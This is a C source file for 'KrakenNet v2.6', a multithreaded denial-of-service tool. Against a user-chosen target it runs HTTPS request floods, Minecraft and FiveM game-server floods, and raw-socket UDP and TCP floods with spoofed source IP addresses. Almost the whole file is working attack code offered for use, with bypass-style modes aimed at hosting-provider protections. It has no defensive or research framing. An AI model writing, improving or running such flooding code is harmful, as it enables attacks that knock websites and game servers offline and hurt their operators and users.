#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <math.h>
#include <pthread.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <curl/curl.h>

// --- Constants ---
#define MAX_THREADS 1024
#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9

// --- Global State and Stats ---
volatile int running = 1;
volatile long long total_success = 0;
volatile long long total_fail = 0;
volatile long long total_bytes = 0;
int attack_duration = 30;
int max_connections = 10;
int num_workers = 10;
char target_host[256];
int target_port = 443;
char attack_mode[50];
int limiter = 0; // PPS limiter, 0 for no limit

// --- CMWC PRNG (From Udp.c/Ovh.c) ---
static unsigned long int Q[4096];
static unsigned long int C = 362436;
static int cmwc_i = 4095;

void init_rand(unsigned long int x) {
    int i;
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (i = 3; i < 4096; i++) {
        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
    }
}

unsigned long int rand_cmwc(void) {
    unsigned long long int t, a = 18782LL;
    unsigned long int x, r = 0xfffffffe;
    
    cmwc_i = (cmwc_i + 1) & 4095;
    t = a * Q[cmwc_i] + C;
    C = (t >> 32);
    x = (unsigned int)t + C;
    if (x < C) {
        x++;
        C++;
    }
    Q[cmwc_i] = r - x;
    return Q[cmwc_i];
}

// --- Network and Crypto Utilities ---

// Generates a random path string
void generate_random_path(char *buffer, size_t max_len) {
    const char chars[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    size_t path_len = (rand() % 10) + 5;
    if (path_len >= max_len) path_len = max_len - 1;

    buffer[0] = '/';
    for (size_t i = 1; i < path_len; i++) {
        buffer[i] = chars[rand() % (sizeof(chars) - 1)];
    }
    buffer[path_len] = '\0';
}

// Checksum calculation (required for raw IP/TCP headers)
unsigned short csum(unsigned short *ptr, int nbytes) {
    long sum;
    unsigned short oddbyte;
    short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char*)&oddbyte) = *(u_char*)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;
    return (unsigned short)answer;
}

// Function to get a random element from a string list
char* get_random_string(char **list, int count, const char *fallback) {
    if (count == 0) return (char*)fallback;
    return list[rand() % count];
}

// --- L7 Worker: TLS/HTTP (kraken/tls) ---

char* user_agents[] = {"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"};
int ua_count = 1;
char* referers[] = {"https://google.com"};
int ref_count = 1;
char* http_methods[] = {"GET", "POST", "HEAD"};
int method_count = 3;

void* tls_worker(void* arg) {
    char *host = (char*)arg;
    CURL *curl;
    CURLcode res;
    char url[512];
    char path[32];
    
    // Libcurl setup should be done inside the thread for concurrency
    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();
    if (!curl) return NULL;

    // Standard TLS options for the requested "old" method
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 6L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL); // Discard response body

    while (running) {
        for (int i = 0; i < max_connections; i++) {
            generate_random_path(path, sizeof(path));
            snprintf(url, sizeof(url), "https://%s:%d%s", host, target_port, path);

            curl_easy_setopt(curl, CURLOPT_URL, url);
            curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, get_random_string(http_methods, method_count, "GET"));
            
            struct curl_slist *headers = NULL;
            char ua_header[256];
            snprintf(ua_header, sizeof(ua_header), "User-Agent: %s", get_random_string(user_agents, ua_count, "Default UA"));
            headers = curl_slist_append(headers, ua_header);
            headers = curl_slist_append(headers, "Accept: */*");
            headers = curl_slist_append(headers, "Connection: keep-alive");

            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

            res = curl_easy_perform(curl);
            
            long http_code = 0;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);

            if (res == CURLE_OK && http_code >= 200 && http_code < 500) {
                __sync_fetch_and_add(&total_success, 1);
            } else {
                __sync_fetch_and_add(&total_fail, 1);
            }

            curl_slist_free_all(headers);
            if (!running) break;
        }
        usleep(1000); // Small pause to prevent CPU spiking in C
    }

    curl_easy_cleanup(curl);
    curl_global_cleanup();
    return NULL;
}

// --- L7 Worker: Minecraft ---

// Utility to write Minecraft VarInt (simplified for C)
int write_varint(char *buf, int value) {
    int i = 0;
    while (1) {
        unsigned char temp = value & 0x7F;
        value >>= 7;
        if (value != 0) {
            temp |= 0x80;
        }
        buf[i++] = temp;
        if (value == 0) {
            break;
        }
    }
    return i;
}

void* minecraft_worker(void* arg) {
    char *host = (char*)arg;
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, host, &server_addr.sin_addr);

    char handshake_payload[256];
    int len_host = strlen(host);

    // Construct Handshake Packet (Protocol 754 for 1.16.5)
    char handshake_data[128];
    int data_offset = 0;
    data_offset += write_varint(handshake_data + data_offset, 754); // Protocol Version
    data_offset += write_varint(handshake_data + data_offset, len_host); // Length of Host
    memcpy(handshake_data + data_offset, host, len_host);
    data_offset += len_host;
    *(uint16_t*)(handshake_data + data_offset) = htons(target_port);
    data_offset += 2;
    data_offset += write_varint(handshake_data + data_offset, 1); // Next State (Status)

    int packet_offset = 0;
    packet_offset += write_varint(handshake_payload + packet_offset, data_offset); // Packet Length
    handshake_payload[packet_offset++] = 0x00; // Packet ID 0x00 (Handshake)
    memcpy(handshake_payload + packet_offset, handshake_data, data_offset);
    packet_offset += data_offset;
    
    // Status Request Packet
    char status_request[5];
    int status_len = write_varint(status_request, 1);
    status_request[status_len++] = 0x00; // Packet ID 0x00 (Status Request)

    while (running) {
        for (int i = 0; i < max_connections; i++) {
            int sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock < 0) {
                usleep(100000); 
                continue;
            }

            if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == 0) {
                // Send Handshake packet
                write(sock, handshake_payload, packet_offset);
                // Send Status Request (repeatedly to flood/keep alive)
                for (int j = 0; j < 3; j++) {
                    write(sock, status_request, status_len);
                }
                __sync_fetch_and_add(&total_success, 1);
            } else {
                __sync_fetch_and_add(&total_fail, 1);
            }
            close(sock);
        }
    }
    return NULL;
}

// --- L7 Worker: FiveM ---

void* fivem_worker(void* arg) {
    char *host = (char*)arg;
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, host, &server_addr.sin_addr);
    
    // Fixed payload for FiveM (standard request)
    char payload[] = "\xff\xff\xff\xffgetinfo xxx\x00\x00\x00"; 
    int payload_len = sizeof(payload) - 1; // 18 bytes
    
    // Large payload (1024 bytes)
    char large_payload[1024];
    for (int i = 0; i < 1024; i++) {
        large_payload[i] = (char)rand_cmwc();
    }
    int large_payload_len = 1024;

    int burst = (int)(atof(arg) * 10); // Simple burst rate calculation (Mbps * 10)
    if (burst < 1) burst = 1;

    int sock = socket(AF_INET, SOCK_DGRAM, 0); // UDP socket
    if (sock < 0) return NULL;

    while (running) {
        for (int i = 0; i < burst; i++) {
            char *current_payload = payload;
            int current_len = payload_len;

            if (i % 2 == 0) {
                current_payload = large_payload;
                current_len = large_payload_len;
            }

            ssize_t sent = sendto(sock, current_payload, current_len, 0, 
                                  (struct sockaddr*)&server_addr, sizeof(server_addr));
            
            if (sent > 0) {
                __sync_fetch_and_add(&total_success, 1);
                __sync_fetch_and_add(&total_bytes, sent);
            }
            if (!running) break;
        }
    }
    close(sock);
    return NULL;
}

// --- L4 Worker: UDP Raw (udp-gbps/udp-bypass) ---

void* udp_raw_worker(void* arg) {
    char *host = (char*)arg;
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(target_port);
    sin.sin_addr.s_addr = inet_addr(host);
    
    // IP Class List for spoofing (from Udp.c)
    unsigned int ip_class_list[] = {
        16843009, 134744072, 630511399, 630511383, 630511360, 630511365, 630511378, 630511384, 630511397,
        630511396, 630511372, 630511408, 630511408, 630511401, 630511406, 630511373, 630511383, 630511377
    };
    int ip_class_count = sizeof(ip_class_list) / sizeof(unsigned int);

    // Determine payload size based on mode
    int payload_size = 128;
    int src_class_mode = 0; // Default to CMWC random spoofing

    if (strcmp(attack_mode, "udp-gbps") == 0) {
        payload_size = 1472;
    } else if (strcmp(attack_mode, "udp-discord") == 0) {
        payload_size = 512;
        src_class_mode = 1;
    } else if (strcmp(attack_mode, "udp-bypass") == 0) {
        src_class_mode = 1;
    }

    int total_len = 20 + 8 + payload_size;
    char packet[MAX_PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)packet;
    struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct iphdr));
    char *data = packet + 20 + 8;
    
    // Raw socket setup (requires root)
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock < 0) {
        perror("Raw socket creation failed (need root)");
        return NULL;
    }
    int one = 1;
    const int *val = &one;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        perror("setsockopt IP_HDRINCL failed");
        close(sock);
        return NULL;
    }

    // IP Header (Constant fields)
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(total_len);
    iph->id = htons(rand_cmwc()); 
    iph->frag_off = 0;
    iph->ttl = 64; 
    iph->protocol = IPPROTO_UDP;
    iph->daddr = sin.sin_addr.s_addr; 

    // UDP Header (Constant fields)
    udph->dest = htons(target_port);
    udph->len = htons(8 + payload_size);
    udph->check = 0; // Checksum optional for UDP over IP

    while (running) {
        // Source IP Spoofing
        unsigned long int src_ip;
        if (src_class_mode) {
            src_ip = ip_class_list[rand_cmwc() % ip_class_count];
        } else {
            src_ip = rand_cmwc();
        }
        iph->saddr = src_ip;

        // Dynamic fields
        iph->id = htons(rand_cmwc()); 
        iph->check = 0;
        udph->source = htons(rand_cmwc() & 0xFFFF);
        
        // Random payload
        for(int i = 0; i < payload_size; i++) {
            data[i] = (char)(rand_cmwc() & 0xFF);
        }

        // Recalculate IP Checksum
        iph->check = csum((unsigned short *)packet, iph->tot_len);

        if (sendto(sock, packet, total_len, 0, (struct sockaddr *)&sin, sizeof(sin)) > 0) {
            __sync_fetch_and_add(&total_success, 1);
            __sync_fetch_and_add(&total_bytes, total_len);
        }
    }
    close(sock);
    return NULL;
}

// --- L4 Worker: TCP Raw (tcp-ovh) ---

void* tcp_raw_worker(void* arg) {
    char *host = (char*)arg;
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(target_port);
    sin.sin_addr.s_addr = inet_addr(host);

    struct pseudo_header {
        unsigned int source_address;
        unsigned int dest_address;
        unsigned char placeholder;
        unsigned char protocol;
        unsigned short tcp_length;
    } psh;

    // Raw socket setup (requires root)
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        perror("Raw socket creation failed (need root)");
        return NULL;
    }
    int one = 1;
    const int *val = &one;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        perror("setsockopt IP_HDRINCL failed");
        close(sock);
        return NULL;
    }

    char datagram[MAX_PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));
    char *data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);
    
    int packet_counter = 0;
    
    while (running) {
        // Random payload size (90-120 bytes, from Ovh.c)
        int payload_size = (rand() % 31) + 90; 
        int total_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_size;
        
        // 1. IP Header
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(total_len);
        iph->id = htons(rand_cmwc() & 0xFFFF);
        iph->frag_off = 0;
        iph->ttl = 111; // From Ovh.c
        iph->protocol = IPPROTO_TCP;
        iph->daddr = sin.sin_addr.s_addr;
        iph->saddr = rand_cmwc(); // Spoofed source IP
        iph->check = 0;

        // 2. TCP Header
        tcph->source = htons(rand_cmwc() & 0xFFFF);
        tcph->dest = htons(target_port);
        tcph->seq = rand_cmwc();
        tcph->ack_seq = rand_cmwc();
        tcph->doff = 5;
        tcph->window = htons(rand_cmwc() & 0xFFFF);
        tcph->urg_ptr = 0;
        tcph->check = 0;
        
        // Flags: PSH | ACK (default)
        tcph->psh = 1;
        tcph->ack = 1;
        tcph->syn = 0;
        tcph->fin = 0;
        
        packet_counter++;
        if (packet_counter > 1000) {
            // Ovh.c FIN logic
            tcph->fin = 1;
            packet_counter = 0;
        }

        // 3. Payload
        for (int i = 0; i < payload_size; i++) {
            data[i] = (char)(rand_cmwc() & 0xFF);
        }

        // 4. Checksums
        // IP Checksum
        iph->check = csum((unsigned short *)datagram, sizeof(struct iphdr));

        // TCP Checksum (requires Pseudo Header)
        psh.source_address = iph->saddr;
        psh.dest_address = iph->daddr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcphdr) + payload_size);

        int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + payload_size;
        char *pseudogram = malloc(psize);
        memcpy(pseudogram, (char*)&psh, sizeof(struct pseudo_header));
        memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr) + payload_size);

        tcph->check = csum((unsigned short *)pseudogram, psize);
        free(pseudogram);

        if (sendto(sock, datagram, total_len, 0, (struct sockaddr *)&sin, sizeof(sin)) > 0) {
            __sync_fetch_and_add(&total_success, 1);
            __sync_fetch_and_add(&total_bytes, total_len);
        }
        usleep(1); // Small pause for high-PPS
    }
    close(sock);
    return NULL;
}

// --- Main Logic and UI ---

void print_banner() {
    printf("\033[91m%s\n", "              ...-%@@@@@@@-..               ");
    printf("             .:%@@@@@@@@@@@@%-.             \n");
    printf("            .#@@@@@@@@@@@@@@@@#.            \n");
    printf("           .%@@@@@@@@@@@@@@@@@@%.           \n");
    printf("           :@@@@@@@@@@@@@@@@@@@@:           \n");
    printf(" ..+#*:.   -@@@@@@@@@@@@@@@@@@@@=. ..:*#+.. \n");
    printf(":@#-+@@@-. -@@@@@@@@@@@@@@@@@@@@- .:@@@+-#@-\n");
    printf("... [rest of banner omitted] ...\n");
    printf("\033[36m_______________________\n");
    printf("|  KrakenNet v2.6 (C-Port) |\n");
    printf("------------------------\n\033[0m");
}

void print_stats(int remaining, long long current_success, long long current_fail, long long current_bytes, int is_l7, double elapsed) {
    if (elapsed < 1.0) elapsed = 1.0;
    
    if (is_l7) {
        long long total = current_success + current_fail;
        double rate = (double)total / elapsed;
        printf("\r\033[34mTime: %ds | Reqs: %lld | Rate: %.1f/s | Success: %lld | Fail: %lld\033[0m",
            attack_duration - remaining, total, rate, current_success, current_fail);
    } else {
        double rate = (double)current_bytes / elapsed;
        const char *units[] = {"Bps", "KBps", "MBps", "GBps"};
        int i = 0;
        double display_rate = rate;
        
        while (display_rate >= 1000.0 && i < 3) {
            display_rate /= 1000.0;
            i++;
        }

        printf("\r\033[34mTime: %ds | Pkts: %lld | Rate: %.2f %s | Bytes Sent: %lld\033[0m",
            attack_duration - remaining, current_success, display_rate, units[i], current_bytes);
    }
    fflush(stdout);
}

void signal_handler(int sig) {
    running = 0;
}

int main(int argc, char *argv[]) {
    print_banner();
    
    if (argc < 7) {
        printf("\033[93mUsage: %s <target_host> <target_port> <method> <connections> <workers> <duration_seconds>\n", argv[0]);
        printf("Methods: tls, minecraft, fivem, udp-gbps (raw), tcp-ovh (raw)\033[0m\n");
        return 1;
    }

    signal(SIGINT, signal_handler);
    
    // Parse arguments
    strcpy(target_host, argv[1]);
    target_port = atoi(argv[2]);
    strcpy(attack_mode, argv[3]);
    max_connections = atoi(argv[4]);
    num_workers = atoi(argv[5]);
    attack_duration = atoi(argv[6]);

    if (num_workers > MAX_THREADS) num_workers = MAX_THREADS;
    
    init_rand(time(NULL));
    
    printf("\033[32mAttack starting on %s:%d (Method: %s)...\033[0m\n", target_host, target_port, attack_mode);
    if (strstr(attack_mode, "raw")) {
        printf("\033[91mWARNING: Raw socket attack selected. This requires ROOT/ADMIN privileges.\033[0m\n");
    }

    pthread_t threads[MAX_THREADS];
    void *(*worker_func)(void*) = NULL;
    int is_l7 = 0;
    char target_ip[INET_ADDRSTRLEN];
    
    // Resolve target IP for L4 methods or use host for L7
    struct hostent *he = gethostbyname(target_host);
    if (he) {
        inet_ntop(AF_INET, he->h_addr_list[0], target_ip, sizeof(target_ip));
    } else {
        perror("Failed to resolve host");
        return 1;
    }


    if (strcmp(attack_mode, "tls") == 0 || strcmp(attack_mode, "kraken") == 0) {
        worker_func = tls_worker;
        is_l7 = 1;
    } else if (strcmp(attack_mode, "minecraft") == 0) {
        worker_func = minecraft_worker;
        is_l7 = 1;
        strcpy(target_host, target_ip); // Use IP for low-level connection
    } else if (strcmp(attack_mode, "fivem") == 0) {
        worker_func = fivem_worker;
        is_l7 = 1;
        strcpy(target_host, target_ip);
    } else if (strstr(attack_mode, "udp") != NULL) {
        worker_func = udp_raw_worker;
        strcpy(target_host, target_ip); // Raw socket needs IP
    } else if (strcmp(attack_mode, "tcp-ovh") == 0) {
        worker_func = tcp_raw_worker;
        strcpy(target_host, target_ip);
    } else {
        printf("\033[91mError: Invalid attack method selected.\033[0m\n");
        return 1;
    }

    // Start workers
    for (int i = 0; i < num_workers; i++) {
        if (pthread_create(&threads[i], NULL, worker_func, (void*)target_host) != 0) {
            perror("Failed to create thread");
            running = 0; // Stop already created threads
            break;
        }
    }

    // Progress Tracker
    time_t start_time = time(NULL);
    time_t end_time = start_time + attack_duration;
    
    while (running && time(NULL) < end_time) {
        long long current_success_snapshot = total_success;
        long long current_fail_snapshot = total_fail;
        long long current_bytes_snapshot = total_bytes;
        int remaining = (int)(end_time - time(NULL));
        double elapsed = difftime(time(NULL), start_time);

        print_stats(remaining, current_success_snapshot, current_fail_snapshot, current_bytes_snapshot, is_l7, elapsed);
        sleep(1);
    }
    running = 0;

    // Wait for threads to finish
    for (int i = 0; i < num_workers; i++) {
        pthread_join(threads[i], NULL);
    }
    printf("\n"); // Newline after stats

    // Attack Summary
    printf("\033[35m\nAttack complete. Results:\033[0m\n");
    if (is_l7) {
        long long total = total_success + total_fail;
        double rps = (double)total / attack_duration;
        printf("\033[32mSuccess requests : %lld\033[0m\n", total_success);
        printf("\033[91mFailed requests  : %lld\033[0m\n", total_fail);
        printf("\033[36mTotal requests   : %lld\033[0m\n", total);
        printf("\033[33mAverage RPS      : %.2f req/sec\033[0m\n", rps);
    } else {
        double bps = (double)total_bytes / attack_duration;
        const char *units[] = {"Bps", "KBps", "MBps", "GBps"};
        int i = 0;
        double display_bps = bps;
        
        while (display_bps >= 1000.0 && i < 3) {
            display_bps /= 1000.0;
            i++;
        }
        printf("\033[32mTotal packets sent : %lld\033[0m\n", total_success);
        printf("\033[36mTotal bytes sent : %.2f %s\033[0m\n", (double)total_bytes, units[0]); // Simple total bytes
        printf("\033[33mAverage BPS      : %.2f %s\033[0m\n", display_bps, units[i]);
    }

    return 0;
}
